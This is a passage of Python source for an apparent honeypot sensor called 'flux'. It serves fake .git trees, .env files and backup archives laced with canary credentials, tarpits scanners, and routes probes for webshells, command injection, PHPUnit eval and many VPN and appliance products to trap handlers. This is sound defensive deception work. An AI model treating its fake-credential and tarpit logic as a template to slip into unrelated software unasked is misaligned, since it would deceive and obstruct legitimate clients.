        ("aws",), client_ip, request_id, host, user_agent, path, proto,
    )
    if tracebit_response is None:
        append_log({**log_context, "status": 502, "result": "backup-archive-error"})
        return web.Response(
            status=502, body=b"upstream credential issue failed\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )
    try:
        body, content_type = _build_backup_archive_body(tracebit_response, ext_family)
    except Exception as exc:  # noqa: BLE001 — render bugs shouldn't crash the sensor
        append_log({
            **log_context, "status": 502, "result": "backup-archive-render-error",
            "error": str(exc)[:400],
        })
        return web.Response(
            status=502, body=b"render error\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )
    response = web.Response(status=200, body=body)
    response.headers["Content-Type"] = content_type
    response.headers["Cache-Control"] = "no-store"
    filename = path.lstrip("/").replace('"', '')
    if filename:
        response.headers["Content-Disposition"] = f'attachment; filename="{filename}"'
    append_log({
        **log_context,
        "status": 200,
        "result": "backup-archive",
        "archiveExt": ext_family,
        "canaryTypes": [k for k, v in tracebit_response.items() if v],
        "bytes": len(body),
    })
    return response


async def _send_fake_git(
    request: web.Request,
    request_id: str,
    path: str,
    git_key: str,
    client_ip: str,
    host: str,
    user_agent: str,
    proto: str,
    log_context: dict[str, object],
) -> web.StreamResponse:
    """Serve the fake /.git tree.

    `path` is the raw (normalized) request path — used only for logging.
    `git_key` is the canonical lowercase `/.git/...` lookup key returned by
    extract_git_path(); it's what we use to look up the response body, so
    prefixed requests (e.g. `/login/.git/config`) find the same file as
    `/.git/config`. See LOGS.md — `path` in the log row is always the raw
    request so analysis can distinguish prefix-probe patterns from direct
    `/.git/` fetches.
    """
    global _active_slow_drips
    result = await _fake_git_get_or_build(client_ip, request_id, host, user_agent, path, proto)
    if result is None:
        append_log({**log_context, "status": 502, "result": "fake-git-error"})
        return web.Response(
            status=502, body=b"upstream credential issue failed\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    files, meta = result
    content = files.get(git_key)
    if content is None:
        append_log({
            **log_context, "status": 404, "result": "fake-git-miss",
            "commitSha": meta.get("commitSha", ""),
            "gitKey": git_key,
        })
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    if git_key.startswith("/.git/objects/") and "/info/" not in git_key:
        content_type = "application/x-git-loose-object"
    else:
        content_type = "text/plain; charset=utf-8"

    if _active_slow_drips >= TARPIT_MAX_CONNECTIONS:
        append_log({**log_context, "status": 503, "result": "fake-git-capacity"})
        return web.Response(
            status=503, body=b"busy\n",
            headers={
                "Content-Type": "text/plain; charset=utf-8",
                "Cache-Control": "no-store",
            },
        )
    _active_slow_drips += 1
    try:
        response = web.StreamResponse(status=200, headers={
            "Content-Type": content_type,
            "Content-Length": str(len(content)),
            "Cache-Control": "no-store",
            "X-Accel-Buffering": "no",
        })
        bytes_sent = 0
        prepared = False
        try:
            await response.prepare(request)
            prepared = True
            append_log({
                **log_context,
                "status": 200,
                "result": "fake-git",
                "commitSha": meta.get("commitSha", ""),
                "rootTreeSha": meta.get("rootTreeSha", ""),
                "secretsBlobSha": meta.get("secretsBlobSha", ""),
                "canaryTypes": meta.get("canaryTypes", []),
                "fakeGitBytes": len(content),
                "fakeGitDripBytes": FAKE_GIT_DRIP_BYTES,
                "fakeGitDripIntervalMs": FAKE_GIT_DRIP_INTERVAL_MS,
            })
            if request.method == "HEAD":
                return response

            interval_s = FAKE_GIT_DRIP_INTERVAL_MS / 1000.0
            for offset in range(0, len(content), FAKE_GIT_DRIP_BYTES):
                chunk = content[offset:offset + FAKE_GIT_DRIP_BYTES]
                await response.write(chunk)
                bytes_sent += len(chunk)
                if offset + FAKE_GIT_DRIP_BYTES < len(content):
                    await asyncio.sleep(interval_s)
        except (ConnectionResetError, asyncio.CancelledError, aiohttp.ClientConnectionError):
            # Scanners regularly close the socket between SYN-ACK and the
            # first byte of body — `prepare()` then raises the same family
            # of errors as `write()`. Treat both the same way so a fast
            # disconnect is a logged event, not an unhandled traceback.
            append_log({
                **log_context,
                "status": 200,
                "result": "fake-git-disconnect" if prepared else "fake-git-prepare-disconnect",
                "fakeGitBytesSent": bytes_sent,
                "commitSha": meta.get("commitSha", ""),
            })
        return response
    finally:
        _active_slow_drips -= 1


async def _send_tarpit(
    request: web.Request,
    request_id: str,
    path: str,
    log_context: dict[str, object],
    query: str,
) -> web.StreamResponse:
    global _active_slow_drips
    ctx: dict[str, object] = {
        "log_context": log_context,
        "path": path,
        "query": query,
        "protocol": log_context.get("protocol", "https"),
        "host": log_context.get("host", ""),
        "send_body": request.method != "HEAD",
        "request_id": request_id,
    }

    # Terminal modules (first match wins).
    for mod in TARPIT_MODULES:
        if mod.terminal and mod.should_run(ctx):
            return await mod.run_terminal(request, ctx)

    # Redirect-chain continuation.
    if query:
        chain_id, hop = _parse_chain_params(query)
        if chain_id and MOD_REDIRECT_CHAIN_ENABLED:
            if hop < MOD_REDIRECT_CHAIN_MAX_HOPS:
                location = f"{path}?_hp_chain={chain_id}&_hp_hop={hop + 1}"
                append_log({
                    **log_context,
                    "status": 302,
                    "result": "tarpit-module",
                    "module": "redirect-chain",
                    "chainId": chain_id,
                    "hop": hop,
                })
                return web.Response(
                    status=302, body=b"redirecting\n",
                    headers={
                        "Location": location,
                        "Content-Type": "text/plain; charset=utf-8",
                        "Cache-Control": "no-store",
                    },
                )
            # Chain exhausted — fall through to drip.

    # Concurrency gate (simple int counter — safe in single-threaded event loop).
    if _active_slow_drips >= TARPIT_MAX_CONNECTIONS:
        append_log({**log_context, "status": 503, "result": "tarpit-capacity"})
        return web.Response(
            status=503, body=b"busy\n",
            headers={
                "Content-Type": "text/plain; charset=utf-8",
                "Cache-Control": "no-store",
            },
        )
    _active_slow_drips += 1
    try:
        # Augmenting modules contribute headers + log metadata.
        aug_meta: dict[str, object] = {}
        extra_headers: dict[str, str] = {}
        for mod in TARPIT_MODULES:
            if not mod.terminal and mod.should_run(ctx):
                mod_headers, mod_meta = mod.augment(request, ctx)
                extra_headers.update(mod_headers)
                if mod_meta:
                    aug_meta[mod.name] = mod_meta

        response = web.StreamResponse(status=200, headers={
            "Content-Type": "text/plain; charset=utf-8",
            "Cache-Control": "no-store",
            "X-Accel-Buffering": "no",
            **extra_headers,
        })
        chunks_sent = 0
        prepared = False
        try:
            await response.prepare(request)
            prepared = True

            log_entry: dict[str, object] = {
                **log_context,
                "status": 200,
                "result": "tarpit",
                "tarpitChunkBytes": TARPIT_CHUNK_BYTES,
                "tarpitIntervalMs": TARPIT_INTERVAL_MS,
                "tarpitSeconds": TARPIT_SECONDS,
            }
            if aug_meta:
                log_entry["modules"] = aug_meta
            append_log(log_entry)

            if request.method == "HEAD":
                return response

            if MOD_VARIABLE_DRIP_ENABLED:
                interval_ms = float(MOD_VARIABLE_DRIP_INITIAL_MS)
            else:
                interval_ms = float(TARPIT_INTERVAL_MS)

            deadline = (time.monotonic() + TARPIT_SECONDS) if TARPIT_SECONDS > 0 else None
            while deadline is None or time.monotonic() < deadline:
                await response.write(build_tarpit_chunk(request_id, path, chunks_sent))
                chunks_sent += 1
                await asyncio.sleep(interval_ms / 1000.0)
                if MOD_VARIABLE_DRIP_ENABLED:
                    interval_ms = min(interval_ms * 1.5, float(MOD_VARIABLE_DRIP_MAX_MS))
        except (ConnectionResetError, asyncio.CancelledError, aiohttp.ClientConnectionError):
            # `prepare()` raises the same family of errors as `write()` when
            # a scanner closes the socket before headers go out. Treat both
            # cases the same so the connection-reset path stays a logged
            # event, not an unhandled traceback.
            append_log({
                **log_context,
                "status": 200,
                "result": "tarpit-disconnect" if prepared else "tarpit-prepare-disconnect",
                "tarpitChunksSent": chunks_sent,
            })
        return response
    finally:
        _active_slow_drips -= 1


async def _send_env(
    request: web.Request,
    request_id: str,
    path: str,
    client_ip: str,
    host: str,
    user_agent: str,
    proto: str,
    log_context: dict[str, object],
) -> web.Response:
    try:
        tracebit_response = await issue_credentials(request_id, client_ip, host, user_agent, path, proto)
    except aiohttp.ClientResponseError as exc:
        append_log({
            **log_context,
            "status": 502,
            "result": "tracebit-http-error",
            "tracebitStatus": exc.status,
            "error": (exc.message or "")[:400],
        })
        return web.Response(
            status=502, body=b"upstream credential issue failed\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )
    except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
        append_log({
            **log_context, "status": 502, "result": "tracebit-error",
            "error": str(exc)[:400],
        })
        return web.Response(
            status=502, body=b"upstream credential issue failed\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    payload = format_env_payload(tracebit_response).encode("utf-8")
    append_log({
        **log_context, "status": 200, "result": "issued",
        "types": [key for key, value in tracebit_response.items() if value],
    })
    return web.Response(
        status=200, body=payload,
        headers={"Content-Type": "text/plain; charset=utf-8"},
    )


async def handle(request: web.Request) -> web.StreamResponse:
    method = request.method
    if method not in ("GET", "HEAD", "POST"):
        return web.Response(status=405, body=b"method not allowed\n")

    request_id = str(uuid.uuid4())
    # Some exploitation clients send meaningful bodies on GET (notably
    # PHPUnit eval-stdin probes). Read a capped body for GET/POST, but only
    # stamp bodySha256 when bytes were actually present so ordinary GET rows
    # do not all collapse onto the empty-body hash.
    read_body = method in {"GET", "POST"}

    body_bytes_read = 0
    body_sha256 = ""
    request_body = b""
    if read_body:
        # Cap body size off the wire. aiohttp returns exactly N bytes or fewer;
        # the scanner's Content-Length is advisory only, not trusted.
        try:
            request_body = await request.content.read(WEBSHELL_BODY_READ_LIMIT)
        except (ConnectionResetError, asyncio.CancelledError, aiohttp.ClientConnectionError):
            # Scanners that send a Content-Length header and then drop the
            # socket before the body arrives are extremely common. Without
            # this handler aiohttp logs a 30-line stack trace per occurrence;
            # the disconnect itself isn't actionable, so close out quietly.
            return web.Response(status=499, body=b"")
        body_bytes_read = len(request_body)
        if body_bytes_read:
            body_sha256 = hashlib.sha256(request_body).hexdigest()

    log_context = _log_context_from_request(request, request_id, body_bytes_read, body_sha256)
    path = str(log_context["path"])
    query_string = str(log_context["query"])
    client_ip = str(log_context["clientIp"])
    host = str(log_context["host"])
    user_agent = str(log_context["userAgent"])
    proto = str(log_context["protocol"])

    if is_webshell_path(path):
        return await _handle_webshell(request, log_context, path, query_string, request_body)

    if is_file_upload_path(path):
        return await _handle_file_upload(request, log_context, path, request_body)

    if is_llm_endpoint_path(path):
        return await _handle_llm_endpoint(request, log_context, path, request_body)

    if is_openapi_swagger_path(path):
        return await _handle_openapi_swagger(request, log_context, request_id, path)

    if is_sonicwall_path(path):
        return await _handle_sonicwall(request, log_context, path, request_body)

    if is_cisco_webvpn_path(path) or is_cisco_anyconnect_config_auth(path, request_body):
        return await _handle_cisco_webvpn(request, log_context, path, request_body)

    if is_ivanti_vpn_path(path):
        return await _handle_ivanti_vpn(request, log_context, path, request_body)

    if is_aspera_faspex_path(path):
        return await _handle_aspera_faspex(request, log_context, path, request_body)

    if is_fortigate_vpn_path(path):
        return await _handle_fortigate_vpn(request, log_context, path, request_body)

    if is_globalprotect_path(path):
        return await _handle_globalprotect(request, log_context, path, request_body)

    if is_sophos_vpn_path(path):
        return await _handle_sophos_vpn(request, log_context, path, request_body)

    if is_barracuda_vpn_path(path):
        return await _handle_barracuda_vpn(request, log_context, path, request_body)

    if is_f5_bigip_path(path):
        return await _handle_f5_bigip(request, log_context, path, request_body)

    if is_docker_registry_path(path):
        return await _handle_docker_registry(request, log_context, path, request_body)

    if is_citrix_gateway_path(path):
        return await _handle_citrix_gateway(request, log_context, path, request_body)

    if is_rdweb_path(path):
        return await _handle_rdweb(request, log_context, path, request_body)

    if is_hikvision_path(path):
        return await _handle_hikvision(request, log_context, path, query_string, request_body)

    if is_hnap1_path(path):
        return await _handle_hnap1(request, log_context, path, query_string, request_body)

    if is_geoserver_path(path):
        return await _handle_geoserver(request, log_context, path, request_body)

    if is_coldfusion_path(path):
        return await _handle_coldfusion(request, log_context, path, request_body)

    if is_confluence_path(path):
        return await _handle_confluence(request, log_context, path, request_body)

    if is_sap_metadatauploader_path(path):
        return await _handle_sap_metadatauploader(request, log_context, path, request_body)

    if is_drupal_path(path):
        return await _handle_drupal(request, log_context, path, query_string, request_body)

    if API_KEY and is_spring_gateway_path(path):
        return await _handle_spring_gateway(
            request, log_context, path, query_string, request_body,
        )

    if is_nextjs_path(path):
        return await _handle_nextjs(request, log_context, path, query_string, request_body)

    if is_cmd_injection_path(path):
        return await _handle_cmd_injection(
            request, log_context, path, query_string, request_body, request_id,
        )

    if is_phpunit_eval_path(path):
        return await _handle_phpunit_eval(request, log_context, path, request_body)

    if is_body_rce_request(path, query_string, request_body):
        return await _handle_body_rce(request, log_context, path, query_string, request_body)

    if is_wp_login_path(path):
        return await _handle_wp_login(request, log_context, path, request_body)

    if is_wp_admin_path(path):
        return await _handle_wp_admin_redirect(request, log_context, path)

    # Web-app form responder runs before the tarpit/fingerprint check so
    # that paths in both lists (e.g. `/`) stay with tarpit; the form trap
    # only matches its own concrete path set, never `/`.
    if is_webapp_form_path(path):
        return await _handle_webapp_form(request, log_context, path, request_body)

    if TARPIT_ENABLED and (is_tarpit_path(path) or is_fingerprint_path(path)):
        return await _send_tarpit(request, request_id, path, log_context, query_string)

    if FAKE_GIT_ENABLED and API_KEY:
        git_key = extract_git_path(path)
        if git_key is not None:
            return await _send_fake_git(
                request, request_id, path, git_key,
                client_ip, host, user_agent, proto, log_context,
            )

    if API_KEY:
        trap = find_canary_trap(path)
        if trap is not None:
            return await _send_canary_trap(
                request, trap, request_id, path, client_ip, host, user_agent, proto, log_context,
            )

    # Backup-archive pattern trap runs after exact-path canary lookup so
    # that explicit entries (e.g. `/backup.sql` -> sql-dump trap) keep
    # their dedicated renderer. Anything matching the broader
    # `<base>.<ext>` shape (including IP-octet / date synthesis stems)
    # lands here.
    if API_KEY and BACKUP_ARCHIVE_ENABLED and is_backup_archive_path(path):
        return await _send_backup_archive(
            request, request_id, path, client_ip, host, user_agent, proto, log_context,
        )

    if path != "/.env" or not API_KEY:
        append_log({**log_context, "status": 404, "result": "not-handled"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    return await _send_env(
        request, request_id, path, client_ip, host, user_agent, proto, log_context,
    )


async def _close_http_session(app: web.Application) -> None:
    global _http_session
    if _http_session is not None and not _http_session.closed:
        await _http_session.close()
    _http_session = None


def create_app() -> web.Application:
    app = web.Application()
    app.router.add_route("*", "/{tail:.*}", handle)
    app.on_cleanup.append(_close_http_session)
    return app


def main() -> int:
    active = []
    if API_KEY:
        active.append("env-canary")
        if FAKE_GIT_ENABLED:
            active.append("fake-git")
        if CANARY_TRAPS_ENABLED:
            active.append("canary-file-traps")
        if BACKUP_ARCHIVE_ENABLED:
            active.append("backup-archive")
    else:
        print(
            "flux: TRACEBIT_API_KEY unset — /.env, /.git/*, and canary file traps disabled (all 404)",
            file=sys.stderr,
        )
    if TARPIT_ENABLED:
        active.append("tarpit")
    if WEBSHELL_ENABLED:
        active.append("webshell")
    if FILE_UPLOAD_ENABLED:
        active.append("file-upload")
    if LLM_ENDPOINT_ENABLED:
        active.append("llm-endpoint")
    if SONICWALL_ENABLED:
        active.append("sonicwall-ssl-vpn")
    if CISCO_WEBVPN_ENABLED:
        active.append("cisco-webvpn")
    if IVANTI_VPN_ENABLED:
        active.append("ivanti-vpn")
    if ASPERA_FASPEX_ENABLED:
        active.append("aspera-faspex")
    if FORTIGATE_VPN_ENABLED:
        active.append("fortigate-vpn")
    if GLOBALPROTECT_ENABLED:
        active.append("globalprotect")
    if SOPHOS_VPN_ENABLED:
        active.append("sophos-vpn")
    if BARRACUDA_VPN_ENABLED:
        active.append("barracuda-vpn")
    if F5_BIGIP_ENABLED:
        active.append("f5-bigip")
    if DOCKER_REGISTRY_ENABLED:
        active.append("docker-registry")
    if CITRIX_GATEWAY_ENABLED:
        active.append("citrix-gateway")
    if RDWEB_ENABLED:
        active.append("rdweb")
    if HIKVISION_ENABLED:
        active.append("hikvision")
    if HNAP1_ENABLED:
        active.append("hnap1-router")
    if GEOSERVER_ENABLED:
        active.append("geoserver")
    if COLDFUSION_ENABLED:
        active.append("coldfusion")
    if CONFLUENCE_ENABLED:
        active.append("confluence")
    if SAP_METADATAUPLOADER_ENABLED:
        active.append("sap-metadatauploader")
    if DRUPAL_ENABLED:
        active.append("drupal")
    if SPRING_GATEWAY_ENABLED and API_KEY:
        active.append("spring-gateway")
    if NEXTJS_ENABLED:
        active.append("nextjs")
    if CMD_INJECTION_ENABLED:
        active.append("cmd-injection")
    if WEBAPP_FORM_ENABLED:
        active.append("webapp-form")
    if WP_LOGIN_ENABLED:
        active.append("wp-login")
    print(
        f"flux: listening on 127.0.0.1:18081 (aiohttp), active traps: {', '.join(active) or 'none'}",
        file=sys.stderr,
    )

    app = create_app()
    web.run_app(app, host="127.0.0.1", port=18081, print=None, access_log=None)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        sys.exit(0)
